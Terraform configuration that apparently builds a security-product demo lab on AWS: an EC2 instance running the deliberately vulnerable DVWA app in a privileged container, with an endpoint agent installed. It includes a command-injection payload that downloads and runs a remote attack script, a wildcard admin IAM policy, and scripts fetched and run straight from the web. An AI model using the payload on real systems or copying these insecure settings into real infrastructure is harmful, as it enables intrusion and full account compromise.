
# data "aws_ami" "latest_ami" {
#   most_recent = true
#   # AL2
#   name_regex = "^amzn2-ami-hvm-.*-gp2"
#   owners     = ["137112412989"]

#   filter {
#     name   = "root-device-type"
#     values = ["ebs"]
#   }

#   filter {
#     name   = "virtualization-type"
#     values = ["hvm"]
#   }

#   filter {
#     name   = "state"
#     values = ["available"]
#   }

#   filter {
#     name   = "architecture"
#     values = ["x86_64"]
#   }
# }



resource "aws_instance" "s1_wiz_instance" {
  tags = var.tags
  # merge(
  #   var.tags,
  #   {
  #     "Name" = "aws-ubuntu"
  #   }
  # )
  ami                    = "ami-0aa2b7722dc1b5612"  #data.aws_ami.latest_ami.image_id
  instance_type          = var.ec2_instance_type
  vpc_security_group_ids = [aws_security_group.sg_s1_wiz.id]
  key_name               = var.keypair
  iam_instance_profile   = aws_iam_instance_profile.web_profile.name
  user_data              = <<EOF
#! /bin/bash
  apt update  -y && apt install -y jq curl
  INSTANCE_ID=$(curl http://169.254.169.254/latest/dynamic/instance-identity/document | jq -r ".instanceId")
  hostnamectl set-hostname $INSTANCE_ID
  curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/ubuntu/install-dvwa-ubuntu2.sh; chmod +x install-dvwa-ubuntu2.sh; ./install-dvwa-ubuntu2.sh
  curl -sLO 'https://raw.githubusercontent.com/s1-howie/s1-agents-helper/master/s1-agent-helper.sh'
  chmod +x s1-agent-helper.sh; ./s1-agent-helper.sh ${var.s1_console_prefix} ${var.s1_api_key} ${var.s1_site_token_aws} ${var.s1_agent_status}
  curl -sLO 'https://s1demostorageaccount.z13.web.core.windows.net/scripts/install_docker.sh'; chmod +x install_docker.sh; ./install_docker.sh
  docker run -d --privileged --name dvwa --restart unless-stopped -p 8080:80 howiehowerton/dvwa-howie:v2
EOF 
}


resource "aws_security_group" "sg_s1_wiz" {
  name = "aws-amzn2-cws-wiz-sg1"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = [local.workstation-external-cidr]
  }

  ingress {
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = [local.workstation-external-cidr]
  }

  ingress {
    from_port   = 8080
    to_port     = 8080
    protocol    = "tcp"
    cidr_blocks = [local.workstation-external-cidr]
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = var.tags
}


resource "aws_iam_instance_profile" "web_profile" {
  name = "aws-amzn2-s1-wiz-instance-profile"
  role = aws_iam_role.s1_wiz_role.name
}

resource "aws_iam_role" "s1_wiz_role" {
  name = "aws-amzn2-s1-wiz-iam-role"
  path = "/"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Sid    = ""
        Principal = {
          Service = "ec2.amazonaws.com"
        }
      },
    ]
  })
  inline_policy {
    name = "aws-amzn2-s1-wiz-inline-admin-policy"
    policy = jsonencode({
      Version = "2012-10-17"
      Statement = [
        {
          Action   = ["*"]
          Effect   = "Allow"
          Resource = "*"
        },
      ]
    })
  }
}


output "instance_EIP" {
  value = aws_instance.s1_wiz_instance.public_ip
}
output "connect_via_ssh" {
  value = "ssh -i ~/.ssh/${var.keypair}.pem ubuntu@${aws_instance.s1_wiz_instance.public_ip}"
}
output "start_instance" {
  value = "aws ec2 start-instances --instance-ids ${aws_instance.s1_wiz_instance.id}"
}
output "stop_instance" {
  value = "aws ec2 stop-instances --instance-ids ${aws_instance.s1_wiz_instance.id}"
}
output "get_public_ip" {
  value = "aws ec2 describe-instances --instance-ids ${aws_instance.s1_wiz_instance.id} | jq -r '.Reservations[].Instances[].PublicIpAddress'"
}
output "dvwa_cmd_injection_text" {
  value = "127.0.0.1; curl -sLO https://raw.githubusercontent.com/s1-howie/s1-wiz/main/s1-wiz-attack.sh; chmod +x s1-wiz-attack.sh; ./s1-wiz-attack.sh ${local.workstation-external-cidr}"
}